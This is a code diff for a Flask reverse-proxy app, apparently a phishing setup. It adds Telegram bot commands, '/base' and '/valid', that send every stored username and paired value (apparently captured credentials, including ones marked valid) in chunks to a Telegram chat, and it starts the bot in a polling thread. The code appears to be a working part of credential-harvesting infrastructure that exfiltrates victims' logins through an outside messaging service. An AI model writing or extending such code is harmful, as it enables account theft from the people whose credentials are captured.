@@ -10,7 +10,7 @@ from flask import Flask, request, make_response, redirect
 import requests
 from telebot.util import quick_markup
 
-from db import check_user, add_user, create_table
+from db import check_user, add_user, create_table, get_all_users, get_valid_users
 
 app = Flask(__name__)
 
@@ -388,9 +388,36 @@ def proxy(path):
         resp.set_cookie(key, response_cookie_value)
     resp.set_cookie('url', target_url)
     return resp
+def bot_polling(bote):
+    bote.infinity_polling()
+@bot.message_handler(commands=['base'])
+def send_welcome(message):
+    users =  get_all_users()
+    user_str = ''
+    for user in users:
+        user_str+=user[0]+':'+ user[1] +'\n'
+        if len(user_str) > 3700:
+            bot.reply_to(message, f"{user_str}")
+            user_str = ''
+    bot.reply_to(message, f"{user_str}")
+
+@bot.message_handler(commands=['valid'])
+def send_welcome(message):
+    users =  get_valid_users()
+    user_str = ''
+    for user in users:
+        user_str+=user[0]+':'+ user[1] +'\n'
+        if len(user_str) > 3700:
+            bot.reply_to(message, f"{user_str}")
+            user_str = ''
+    bot.reply_to(message, f"{user_str}")
 
 
 if __name__ == '__main__':
+    Thread(target=bot_polling, args=[bot]).start()
+    #bot.infinity_polling()
     create_table()
     app.run()
+
+
 
